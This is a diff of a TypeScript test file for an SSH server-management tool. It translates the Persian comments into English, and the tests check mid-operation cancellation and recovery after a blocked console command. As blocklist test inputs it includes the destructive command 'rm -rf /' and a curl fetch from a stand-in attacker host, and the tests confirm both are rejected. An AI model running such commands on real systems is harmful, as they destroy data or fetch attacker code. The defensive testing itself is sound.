@@ -1,8 +1,8 @@
-// تست‌های بازیابی §۵ (v0.3.1) — «نتیجهٔ واقعی» بررسی می‌شود، نه فقط اجرای دستور.
-//  • قطع ارتباط وسط عملیات: لغو واقعی execCancellable روی SSH واقعی +
-//    نتیجهٔ «لغوشده» و رویدادهای job.
-//  • اجرای دوباره پس از خطا: دستور مسدود (خطای کنسول) → سیستم سالم →
-//    دستور مجاز بعدی واقعاً اجرا می‌شود.
+// §5 recovery tests (v0.3.1) — the "real outcome" is verified, not just that a command ran.
+//  • disconnect mid-operation: a real execCancellable cancel over real SSH +
+//    a "cancelled" outcome and job events.
+//  • retry after an error: a blocked command (console error) → a healthy system →
+//    the next allowed command actually runs.
 
 import { afterAll, beforeAll, expect, test } from "bun:test";
 import { startTestServer, TEST_HOST, TEST_PASSWORD, type TestServerHandle } from "./server";
@@ -25,7 +25,7 @@ const hsPrefix = "/tmp/hs-bin/headscale --config /home/z/hs-test/config.yaml";
 beforeAll(async () => {
   ensureHeadscaleHealthy();
   ts = await startTestServer({ port: 0 });
-  stack = buildTestStack({ authMode: "open" }); // v0.3.2 §2: تست منطق کسب‌وکار در استثنای مستندِ توسعه (بدون احراز هویت)
+  stack = buildTestStack({ authMode: "open" }); // v0.3.2 §2: business-logic tests under the documented dev exception (no auth)
   srv = await listenApp(stack.app);
   sid = await connectAndConfirm(srv.baseUrl, {
     host: TEST_HOST,
@@ -57,25 +57,25 @@ async function post(path: string, body: unknown): Promise<{ status: number; body
 }
 
 // ---------------------------------------------------------------------------
-// ۱) قطع ارتباط وسط عملیات — لغوی واقعی روی کانال SSH زنده
+// 1) disconnect mid-operation — a real cancel on a live SSH channel
 // ---------------------------------------------------------------------------
-test("mid-op cancel: execCancellable واقعی → لغو وسط اجرا → نتیجهٔ صادقانهٔ «لغوشده»", async () => {
+test("mid-op cancel: real execCancellable → cancel mid-run → honest \"cancelled\" outcome", async () => {
   const ctx = stack.manager.hsContext(sid);
   expect(ctx).toBeTruthy();
 
-  // دستور طولانیِ بی‌اثر (۳ ثانیه) — از لایهٔ SSH مستقیم؛ مثل جریان نصب که
-  // اسکریپت را با execCancellable اجرا می‌کند (allowlist فقط ویژگیٔ کنسول است).
+  // a long no-op command (3s) — straight from the SSH layer; like the install flow
+  // which runs its script via execCancellable (the allowlist is a console-only feature).
   const { result, cancel } = ctx.ssh.execCancellable(
     "sleep 3 && echo FINISHED_AFTER_SLEEP",
     { timeoutMs: 20_000, onStdout: () => undefined, onStderr: () => undefined },
   );
-  // ۴۰۰ms بعد لغو می‌کنیم — قطع ارتباط وسط عملیات
+  // cancel after 400ms — a disconnect in the middle of the operation
   await new Promise((r) => setTimeout(r, 400));
   cancel();
 
-  // دو مسیر صادقانهٔ لغو در ssh.ts: (الف) resolve با cancelled:true و خروجی
-  // ناقص؛ (ب) throw با HemError EXEC_FAILED + detail.cancelled. هر دو یعنی
-  // «لغو» — هیچ‌کدام «موفقیت» نیست و فرمان نباید تا انتها اجرا شده باشد.
+  // the two honest cancel paths in ssh.ts: (a) resolve with cancelled:true and
+  // partial output; (b) a throw with HemError EXEC_FAILED + detail.cancelled. Both mean
+  // "cancelled" — neither is "success" and the command must not have run to completion.
   let outcome: "resolved-cancelled" | "thrown-cancelled" | "BAD-completed" = "BAD-completed";
   let resolved: { stdout: string; code: number | null; cancelled?: boolean } | null = null;
   let thrown: HemError | null = null;
@@ -92,23 +92,23 @@ test("mid-op cancel: execCancellable واقعی → لغو وسط اجرا → �
       }
     }
   }
-  expect(outcome).not.toBe("BAD-completed"); // فرمان کامل «اجرا شده و موفق» جعلی است
+  expect(outcome).not.toBe("BAD-completed"); // a fully "run and succeeded" command would be fake
   if (outcome === "resolved-cancelled" && resolved) {
-    expect(resolved.stdout).not.toContain("FINISHED_AFTER_SLEEP"); // واقعاً وسط کار قطع شد
+    expect(resolved.stdout).not.toContain("FINISHED_AFTER_SLEEP"); // truly cut off mid-run
   } else if (outcome === "thrown-cancelled" && thrown) {
     expect(thrown.code).toBe("EXEC_FAILED");
   }
 });
 
-test("mid-op cancel: job واقعی با رویدادهای job:* — نتیجهٔ نهایی «لغو» است نه موفقیت", async () => {
+test("mid-op cancel: a real job with job:* events — the final outcome is \"cancelled\", not success", async () => {
   const ctx = stack.manager.hsContext(sid);
   const jobs = stack.jobs;
   const events: string[] = [];
   const jobId = "job-recovery-cancel";
   jobs.register({ id: jobId, type: "recovery-test", sessionId: sid, startedAt: Date.now(), cancel: () => undefined });
-  const streamer = jobs; // رویدادها را از طریق subscribe عمومی نمی‌گیریم؛ از خود JobManager می‌خوانیم
+  const streamer = jobs; // we don't get events via the public subscribe; we read from the JobManager itself
 
-  // شبیه‌سازی دقیق runInstallJob: استریم + لغو + jobDone(false)
+  // exact simulation of runInstallJob: streaming + cancel + jobDone(false)
   const log = (line: string): void => streamer.jobLog(jobId, line);
   log("شروع عملیات آزمایشی طولانی …");
   const { result, cancel } = ctx.ssh.execCancellable("sleep 3 && echo SHOULD_NOT_APPEAR", {
@@ -146,31 +146,31 @@ test("mid-op cancel: job واقعی با رویدادهای job:* — نتیجه
 
   const rec = jobs.get(jobId) as unknown as { ok?: boolean; summary?: string; status?: string } | undefined;
   expect(rec).toBeTruthy();
-  expect(rec?.ok).toBe(false); // هرگز «موفق» نیست
+  expect(rec?.ok).toBe(false); // never "ok"
   expect(rec?.summary).toContain("لغو");
-  // لغو واقعی رخ داده و فرمان تا انتها اجرا نشده
+  // a real cancel happened and the command did not run to the end
   expect(cancelledFlag || events.includes("resolved-cancelled") || events.includes("thrown-cancelled")).toBe(true);
   expect(completedFully).toBe(false);
   expect(events).not.toContain("exit:0");
 });
 
 // ---------------------------------------------------------------------------
-// ۲) اجرای دوبارهٔ عملیات پس از خطا — سیستم سالم می‌ماند و عملیات بعدی واقعی است
+// 2) retrying the operation after an error — the system stays healthy and the next operation is real
 // ---------------------------------------------------------------------------
-test("retry-after-error: دستور مسدود (خطا) → سیستم سالم → دستور مجاز بعدی واقعاً اجرا می‌شود", async () => {
-  // الف) خطا: دستور آزادِ مسدود — هرگز اجرا نمی‌شود
+test("retry-after-error: a blocked command (error) → healthy system → the next allowed command actually runs", async () => {
+  // (a) the error: a blocked free-form command — never executed
   const blocked = await post(`/api/s/${sid}/console`, { cmd: "rm -rf /" });
   expect([403, 400, 500]).toContain(blocked.status);
   expect(blocked.body?.error).toBe("COMMAND_BLOCKED");
 
-  // ب) سلامت بعد از خطا: نشست هنوز متصل است و exec واقعی جواب می‌دهد
+  // (b) health after the error: the session is still connected and a real exec answers
   const ok1 = await post(`/api/s/${sid}/console`, { cmd: "df -h" });
   expect(ok1.status).toBe(200);
   expect(ok1.body?.ok).toBe(true);
   expect(ok1.body?.exitCode).toBe(0);
   expect(String(ok1.body?.stdout)).toContain("Filesystem");
 
-  // ج) خطای دیگر (پیش‌نمایش مسدود) → باز اجرای بعدی سالم
+  // (c) another error (a blocked preview) → the next run is still healthy
   const blocked2 = await post(`/api/s/${sid}/console/preview`, { cmd: "curl http://evil.example.com/x" });
   expect(blocked2.status).toBe(200);
   expect(blocked2.body?.allowed).toBe(false);
